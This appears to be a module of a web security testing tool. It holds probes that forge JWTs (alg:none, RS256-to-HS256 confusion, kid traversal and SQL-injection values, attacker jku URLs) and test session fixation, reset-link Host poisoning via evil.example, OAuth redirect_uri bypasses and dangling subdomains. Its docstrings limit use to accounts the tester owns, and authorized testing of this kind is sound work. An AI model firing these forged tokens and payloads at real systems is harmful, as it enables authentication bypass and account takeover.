#!/usr/bin/env python3
"""Identity primitives — JWT (alg confusion / kid / jku), session lifecycle, reset tokens,
OAuth redirect_uri, subdomain takeover.

Every proof here uses accounts you control. "Account A's session ended up bound to account B" is the
shape of the evidence; intercepting a real user's flow is not.
"""
from __future__ import annotations

import base64
import json
import re
import time

from . import Ctx, ProbeResult, TIMEOUT, blocked, primitive, requests, send, start_sink, sink_hits

SPOOF_SUB = "pwned-subject-9c2f"


def _b64(d: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).decode().rstrip("=")


def _unverified(tok: str) -> tuple[dict, dict]:
    parts = tok.split(".")
    out = []
    for p in parts[:2]:
        try:
            out.append(json.loads(base64.urlsafe_b64decode(p + "=" * (-len(p) % 4))))
        except Exception:                              # noqa: BLE001
            out.append({})
    return (out + [{}, {}])[:2]


@primitive("jwt_alg_confusion", group="A", cwe="CWE-347", needs="--opt token=<a valid JWT>")
def jwt_alg_confusion(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """alg:none, and HS256 signed with the RS256 public key from the target's own JWKS."""
    ctx = ctx or Ctx()
    tok = ctx.opts.get("token", "")
    if not tok or tok.count(".") != 2:
        return blocked("jwt_alg_confusion", endpoint,
                       "needs a valid JWT to mutate — pass --opt token=<jwt> (log in as an account "
                       "you own and copy it)")
    head, payload = _unverified(tok)
    url = f"{base}{endpoint}"
    spoofed = dict(payload)
    spoofed["sub"] = SPOOF_SUB

    # 1) alg:none
    for alg in ("none", "None", "nOnE"):
        forged = f"{_b64({**head, 'alg': alg})}.{_b64(spoofed)}."
        try:
            r = requests.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code < 400 and SPOOF_SUB in (r.text or ""):
            return ProbeResult("jwt_alg_confusion", True, endpoint, f"alg:{alg}", r.status_code,
                               "unsigned token accepted; the spoofed subject is echoed back",
                               {"variant": f"alg:{alg}", "snippet": (r.text or "")[:300]})

    # 2) RS256 -> HS256 confusion, signing with the published public key
    if (head.get("alg") or "").upper().startswith("RS"):
        for jwks_path in ("/.well-known/jwks.json", "/jwks.json", "/oauth/jwks",
                          ctx.opts.get("jwks", "")):
            if not jwks_path:
                continue
            try:
                jr = requests.get(f"{base}{jwks_path}", timeout=TIMEOUT)
            except requests.RequestException:
                continue
            if jr.status_code != 200 or "keys" not in (jr.text or ""):
                continue
            try:
                import jwt as pyjwt
                from cryptography.hazmat.primitives import serialization
                from jwt.algorithms import RSAAlgorithm
                key = json.loads(jr.text)["keys"][0]
                pub = RSAAlgorithm.from_jwk(json.dumps(key))
                pem = pub.public_bytes(serialization.Encoding.PEM,
                                       serialization.PublicFormat.SubjectPublicKeyInfo)
                forged = pyjwt.encode(spoofed, pem, algorithm="HS256")
            except Exception:                          # noqa: BLE001 - library/shape mismatch
                continue
            try:
                r = requests.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=TIMEOUT)
            except requests.RequestException:
                continue
            if r.status_code < 400 and SPOOF_SUB in (r.text or ""):
                return ProbeResult("jwt_alg_confusion", True, endpoint, "RS256->HS256", r.status_code,
                                   "token signed with the server's PUBLIC key was accepted as HS256",
                                   {"jwks": jwks_path, "snippet": (r.text or "")[:300]})
    return ProbeResult("jwt_alg_confusion", False, endpoint, detail="algorithm is pinned/verified")


@primitive("jwt_kid", group="A", cwe="CWE-347", needs="--opt token=<a valid JWT>")
def jwt_kid(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """`kid` used as a file path or a SQL value — traversal to a predictable key, or injection."""
    ctx = ctx or Ctx()
    tok = ctx.opts.get("token", "")
    if not tok or tok.count(".") != 2:
        return blocked("jwt_kid", endpoint, "needs a valid JWT — pass --opt token=<jwt>")
    head, payload = _unverified(tok)
    if "kid" not in head:
        return ProbeResult("jwt_kid", False, endpoint, detail="no kid header in use")
    spoofed = {**payload, "sub": SPOOF_SUB}
    url = f"{base}{endpoint}"
    try:
        import jwt as pyjwt
    except ImportError:
        return blocked("jwt_kid", endpoint, "PyJWT not available to mint the test tokens")

    # An empty/nulled key file makes HMAC("") the signature the server will compute.
    candidates = [("../../../../../../dev/null", ""), ("/dev/null", ""),
                  ("../../../../../../etc/hostname", None),
                  ("' UNION SELECT 'x'-- ", "x"), ("x' OR '1'='1", "")]
    for kid, key in candidates:
        if key is None:
            continue
        try:
            forged = pyjwt.encode(spoofed, key, algorithm="HS256", headers={"kid": kid})
            r = requests.get(url, headers={"Authorization": f"Bearer {forged}"}, timeout=TIMEOUT)
        except Exception:                              # noqa: BLE001
            continue
        if r.status_code < 400 and SPOOF_SUB in (r.text or ""):
            return ProbeResult("jwt_kid", True, endpoint, f"kid={kid!r}", r.status_code,
                               "kid is resolved to a key without validation; a controlled key "
                               "signed an accepted token",
                               {"kid": kid, "snippet": (r.text or "")[:300]})
    return ProbeResult("jwt_kid", False, endpoint, detail="kid resolution appears constrained")


@primitive("jwt_jku", group="A", cwe="CWE-347", needs="--opt token=<a valid JWT>")
def jwt_jku(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """jku/x5u pointing at a host we control — confirmed by the fetch, not by acceptance."""
    ctx = ctx or Ctx()
    tok = ctx.opts.get("token", "")
    if not tok or tok.count(".") != 2:
        return blocked("jwt_jku", endpoint, "needs a valid JWT — pass --opt token=<jwt>")
    head, payload = _unverified(tok)
    callback, srv = start_sink()
    try:
        try:
            import jwt as pyjwt
            forged = pyjwt.encode({**payload, "sub": SPOOF_SUB}, "k", algorithm="HS256",
                                  headers={**head, "jku": callback, "alg": "RS256"})
        except Exception:                              # noqa: BLE001
            return blocked("jwt_jku", endpoint, "PyJWT not available to mint the test token")
        try:
            requests.get(f"{base}{endpoint}", headers={"Authorization": f"Bearer {forged}"},
                         timeout=TIMEOUT)
        except requests.RequestException:
            pass
        time.sleep(0.6)
        if sink_hits():
            return ProbeResult("jwt_jku", True, endpoint, "jku -> our listener", 0,
                               "the verifier fetched a key set from an attacker-supplied URL",
                               {"callbacks": sink_hits()})
    finally:
        srv.shutdown()
    return ProbeResult("jwt_jku", False, endpoint, detail="jku/x5u not fetched")


@primitive("session_fixation", group="A", cwe="CWE-384",
           needs="--opt login=/path and credentials for an account you own")
def session_fixation(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """Is the session id the same before and after authentication? Then: does logout invalidate it?"""
    ctx = ctx or Ctx()
    login = ctx.opts.get("login") or endpoint
    user, pw = ctx.opts.get("username"), ctx.opts.get("password")
    if not user or not pw:
        return blocked("session_fixation", endpoint,
                       "needs credentials for an account you own — --opt username=.. password=..")
    COOKIE_RE = r"([A-Za-z0-9_\-]*(?:session|sid|sess|jsessionid|connect\.sid|auth)[A-Za-z0-9_\-]*)=([^;]+)"

    # Learn the session cookie's NAME, from wherever the app happens to set one. Many apps issue no
    # cookie to an anonymous visitor at all, which is why reading "/" alone misses the whole class.
    name = ""
    for probe_path in ("/", ctx.opts.get("session_path", "/api/session/new"), "/login"):
        if not probe_path:
            continue
        try:
            r = requests.get(f"{base}{probe_path}", timeout=TIMEOUT)
        except requests.RequestException:
            continue
        m = re.search(COOKIE_RE, r.headers.get("Set-Cookie", ""), re.I)
        if m:
            name = m.group(1)
            break
    if not name:
        try:
            r = requests.post(f"{base}{login}", json={"username": user, "password": pw},
                              timeout=TIMEOUT)
            m = re.search(COOKIE_RE, r.headers.get("Set-Cookie", ""), re.I)
            name = m.group(1) if m else ""
        except requests.RequestException:
            pass
    if not name:
        return blocked("session_fixation", login,
                       "no session cookie observed — cannot test whether the identifier rotates")

    # The decisive test: present an id WE chose, authenticate, and see whether that exact value is
    # the authenticated session afterwards. This catches apps that issue nothing pre-auth, which a
    # simple before/after comparison silently passes.
    fixed = f"fixated{int(time.time())}9c2f"
    try:
        post = requests.post(f"{base}{login}", json={"username": user, "password": pw},
                             headers={"Cookie": f"{name}={fixed}"}, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("session_fixation", False, login, detail=str(e))
    post_cookie = post.headers.get("Set-Cookie", "")
    m = re.search(COOKIE_RE, post_cookie, re.I)
    issued = m.group(2) if m else ""

    if post.status_code < 400 and (issued == fixed or not issued):
        # confirm the attacker-chosen value really is authenticated now
        try:
            who = requests.get(f"{base}{ctx.opts.get('me', '/api/me')}",
                               headers={"Cookie": f"{name}={fixed}"}, timeout=TIMEOUT)
        except requests.RequestException:
            who = None
        if who is not None and who.status_code < 400 and user in (who.text or ""):
            return ProbeResult("session_fixation", True, login, f"{name}={fixed}", post.status_code,
                               "an attacker-chosen session id was accepted at login and is "
                               "authenticated afterwards — the identifier is never rotated",
                               {"cookie_name": name, "fixed_value": fixed,
                                "set_cookie": post_cookie[:200],
                                "verified_on": ctx.opts.get("me", "/api/me")})
        if not issued:
            return ProbeResult("session_fixation", True, login, f"{name}={fixed}", post.status_code,
                               "login issued no new session cookie while a client-supplied id was "
                               "present — the pre-auth identifier survives authentication",
                               {"cookie_name": name, "set_cookie": post_cookie[:200],
                                "confidence": "no post-auth Set-Cookie observed"})
    return ProbeResult("session_fixation", False, login,
                       detail="the session identifier is rotated on authentication",
                       evidence={"cookie_name": name, "set_cookie": post_cookie[:200]})


@primitive("pwreset_token", group="A", cwe="CWE-640",
           needs="--opt reset=/path and two addresses you own")
def pwreset_token(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """Compare two reset tokens for structure/entropy, and test host-header poisoning of the link.

    Only ever for addresses you control — a reset for someone else's account is a real email to a
    real person.
    """
    ctx = ctx or Ctx()
    path = ctx.opts.get("reset") or endpoint
    emails = [e for e in str(ctx.opts.get("emails", "")).split(",") if e]
    if len(emails) < 1:
        return blocked("pwreset_token", path,
                       "needs at least one address you own — --opt emails=you+a@yourdomain,"
                       "you+b@yourdomain. Never trigger a reset for an address you do not control")

    findings, tokens = [], []
    for e in emails[:2]:
        try:
            r = requests.post(f"{base}{path}", json={"email": e}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        m = re.search(r"[?&](?:token|code|key|t)=([A-Za-z0-9_\-\.]{8,})", r.text or "")
        if m:
            tokens.append(m.group(1))
    if len(tokens) >= 2:
        a, b = tokens[0], tokens[1]
        if len(a) == len(b) and re.fullmatch(r"[0-9a-f]+", a or "") and a[:4] == b[:4]:
            findings.append(f"tokens share a {len(a)}-hex structure with a common prefix "
                            f"({a[:4]}…) — likely derived from a predictable input")
        if len(a) < 16:
            findings.append(f"token is only {len(a)} chars — insufficient entropy")

    # host-header poisoning of the link
    try:
        r = requests.post(f"{base}{path}", json={"email": emails[0]},
                          headers={"Host": "evil.example", "X-Forwarded-Host": "evil.example"},
                          timeout=TIMEOUT)
        if "evil.example" in (r.text or ""):
            findings.append("the reset link is built from the request Host/X-Forwarded-Host header")
    except requests.RequestException:
        pass

    if findings:
        return ProbeResult("pwreset_token", True, path, "two resets + host header", 0,
                           "; ".join(findings),
                           {"issues": findings,
                            "tokens_prefix": [t[:6] + "…" for t in tokens]})
    return ProbeResult("pwreset_token", False, path,
                       detail="tokens look random, unbound to the request host")


@primitive("oauth_redirect", group="A", cwe="CWE-601", needs="--opt authorize=/oauth/authorize")
def oauth_redirect(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """redirect_uri validation: prefix match, path append, and normalization gaps."""
    ctx = ctx or Ctx()
    path = ctx.opts.get("authorize") or endpoint
    registered = ctx.opts.get("redirect_uri", f"{base}/callback")
    variants = [
        f"{registered}.evil.example",
        f"{registered}/../../evil",
        f"{registered}@evil.example",
        f"{registered}%2f..%2f..%2fevil",
        f"{registered}#@evil.example",
        "https://evil.example",
        registered.replace("https://", "http://"),
    ]
    for v in variants:
        try:
            r = requests.get(f"{base}{path}",
                             params={"client_id": ctx.opts.get("client_id", "test"),
                                     "response_type": "code", "redirect_uri": v,
                                     "state": ctx.marker},
                             allow_redirects=False, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        loc = r.headers.get("Location", "")
        if "evil.example" in loc or (r.status_code < 400 and "evil.example" in (r.text or "")):
            return ProbeResult("oauth_redirect", True, path, v, r.status_code,
                               "redirect_uri validation accepted an attacker-controlled host — "
                               "the authorization code can be delivered off-origin",
                               {"variant": v, "location": loc[:300]})
    # `state` absence is the other half of this class
    try:
        r = requests.get(f"{base}{path}",
                         params={"client_id": ctx.opts.get("client_id", "test"),
                                 "response_type": "code", "redirect_uri": registered},
                         allow_redirects=False, timeout=TIMEOUT)
        if r.status_code < 400 and "state" not in (r.headers.get("Location", "") + (r.text or "")):
            return ProbeResult("oauth_redirect", True, path, "(no state)", r.status_code,
                               "the authorization request is accepted with no `state` — login CSRF: "
                               "the victim can be silently signed into the attacker's account",
                               {"issue": "missing state parameter"})
    except requests.RequestException:
        pass
    return ProbeResult("oauth_redirect", False, path, detail="redirect_uri appears exact-matched")


@primitive("subdomain_takeover", group="F", cwe="CWE-350", detection_only=True)
def subdomain_takeover(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """Dangling CNAME + a provider's unclaimed-resource fingerprint. Never claims the resource."""
    ctx = ctx or Ctx()
    from urllib.parse import urlsplit
    host = urlsplit(base).hostname or ""
    fingerprints = {
        "github-pages": "there isn't a github pages site here",
        "heroku": "no such app",
        "aws-s3": "nosuchbucket",
        "azure": "web app - unavailable",
        "shopify": "sorry, this shop is currently unavailable",
        "fastly": "fastly error: unknown domain",
        "netlify": "not found - request id",
        "surge": "project not found",
        "readthedocs": "unknown domain",
        "zendesk": "help center closed",
    }
    cname = ""
    try:
        import dns.resolver
        answers = dns.resolver.resolve(host, "CNAME")
        cname = str(answers[0].target).rstrip(".")
    except Exception:                                  # noqa: BLE001 - no CNAME, or no dnspython
        pass
    try:
        r = requests.get(base, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("subdomain_takeover", False, host, detail=str(e))
    low = (r.text or "").lower()
    for provider, fp in fingerprints.items():
        if fp in low:
            return ProbeResult("subdomain_takeover", True, host, cname or "(no CNAME)",
                               r.status_code,
                               f"{host} serves {provider}'s unclaimed-resource page — the pointer "
                               f"is dangling (detection only; the resource was NOT registered)",
                               {"provider": provider, "cname": cname, "fingerprint": fp,
                                "detection_only": True})
    return ProbeResult("subdomain_takeover", False, host, cname,
                       detail="no unclaimed-resource fingerprint",
                       evidence={"cname": cname})
